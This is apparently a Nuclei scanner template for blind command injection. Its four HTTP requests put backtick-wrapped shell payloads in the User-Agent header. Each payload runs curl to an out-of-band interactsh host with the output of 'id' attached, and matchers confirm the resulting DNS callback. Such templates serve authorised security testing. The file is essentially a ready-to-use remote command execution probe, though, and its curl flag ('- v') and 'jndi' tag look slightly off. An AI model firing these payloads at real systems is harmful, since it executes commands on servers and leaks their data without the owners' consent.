id: blind-command-injection-dk4trin
info:
  author: dk4trin
  description: Command Injection Blind
  name: dk4trin Blind Command Injection
  severity: high
  tags: rce,jndi,oast,blind,command,injection
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{hostname}}

    User-Agent: `curl - v {{interactsh-url}}$(id)`

    '
  - 'GET / HTTP/1.1

    Host: {{hostname}}

    User-Agent: `curl - v {{interactsh-url}}.$(id)`

    '
  - 'GET / HTTP/1.1

    Host: {{hostname}}

    User-Agent: `curl - v $(id){{interactsh-url}}`

    '
  - 'GET / HTTP/1.1

    Host: {{hostname}}

    User-Agent: `curl - v $(id).{{interactsh-url}}$(id)`

    '
